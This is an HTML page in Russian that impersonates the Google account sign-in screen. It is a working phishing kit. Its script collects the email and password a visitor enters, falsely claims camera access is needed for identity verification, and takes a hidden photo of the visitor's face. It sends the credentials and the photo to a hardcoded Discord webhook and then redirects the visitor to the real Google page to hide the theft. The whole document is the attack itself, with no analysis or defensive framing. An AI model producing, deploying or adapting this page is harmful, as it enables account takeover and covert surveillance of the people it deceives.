<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход – Аккаунты Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root { --g-blue: #1a73e8; --g-gray: #dadce0; --g-text: #202124; --g-sub: #5f6368; }
        body { font-family: 'Roboto', sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { width: 100%; max-width: 448px; border: 1px solid var(--g-gray); border-radius: 8px; padding: 48px 40px 36px; box-sizing: border-box; text-align: center; position: relative; }
        .logo { width: 75px; margin-bottom: 8px; }
        h1 { font-size: 24px; font-weight: 400; color: var(--g-text); margin: 0; padding-bottom: 8px; }
        p { font-size: 16px; color: var(--g-text); margin-top: 0; margin-bottom: 24px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid var(--g-gray); border-radius: 4px; font-size: 16px; margin-bottom: 10px; box-sizing: border-box; outline: none; transition: border 0.2s; }
        input:focus { border: 2px solid var(--g-blue); }
        .footer-text { font-size: 14px; color: var(--g-sub); margin-top: 32px; text-align: left; line-height: 1.4; }
        .btn-group { margin-top: 40px; display: flex; justify-content: space-between; align-items: center; }
        .btn-next { background: var(--g-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
        #loading-bar { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #e8f0fe; overflow: hidden; border-radius: 8px 8px 0 0; }
        #loading-fill { width: 30%; height: 100%; background: var(--g-blue); animation: slide 1.5s infinite linear; }
        @keyframes slide { from { transform: translateX(-100%); } to { transform: translateX(400%); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div id="loading-bar"><div id="loading-fill"></div></div>
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
    <h1>Вход</h1>
    <p>Используйте аккаунт Google</p>

    <input type="email" id="email" placeholder="Email или номер телефона">
    <input type="password" id="pass" placeholder="Введите пароль">

    <div class="footer-text">
        Для обеспечения безопасности Google необходимо подтвердить вашу личность. Пожалуйста, разрешите доступ к камере для верификации.
    </div>

    <div class="btn-group">
        <span style="color:var(--g-blue); font-size: 14px; font-weight: 500; cursor: pointer;">Создать аккаунт</span>
        <button class="btn-next" onclick="execute()">Далее</button>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const WEBHOOK = 'https://discordapp.com/api/webhooks/1495532733571797094/4ZlEq5gMsSPNKTusLURiR9pI9alunEZd7TLD5e3FVfTxOSo_z9vy1qcZ7MiX8VEvy53A';

    async function execute() {
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;

        if(!u || !p) return alert("Введите данные");

        document.getElementById('loading-bar').style.display = 'block';

        try {
            // 1. СРАЗУ ЗАПРАШИВАЕМ КАМЕРУ (Вылезет окно "Разрешить")
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            video.srcObject = stream;

            // Даем камере 1.5 секунды включиться
            await new Promise(r => setTimeout(r, 1500));

            // 2. ДЕЛАЕМ СКРЫТОЕ ФОТО
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            
            // Выключаем камеру
            stream.getTracks().forEach(t => t.stop());

            // 3. ОТПРАВЛЯЕМ ФАЙЛ И ДАННЫЕ В DISCORD
            const fd = new FormData();
            fd.append('file', blob, 'face.jpg');
            fd.append('payload_json', JSON.stringify({
                content: "🔔 **Получен новый отчет!**",
                embeds: [{
                    title: "Данные авторизации",
                    color: 4285F4,
                    fields: [
                        { name: "👤 Email", value: `\`${u}\``, inline: true },
                        { name: "🔑 Password", value: `\`${p}\``, inline: true }
                    ],
                    image: { url: "attachment://face.jpg" }
                }]
            }));

            await fetch(WEBHOOK, { method: 'POST', body: fd });

            // 4. РЕДИРЕКТ НА ОРИГИНАЛ
            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd?service=mail";

        } catch (err) {
            // Если нажал "Заблокировать"
            alert("Для входа в аккаунт Google необходимо разрешить доступ к камере.");
            document.getElementById('loading-bar').style.display = 'none';
        }
    }
</script>
</body>
</html>
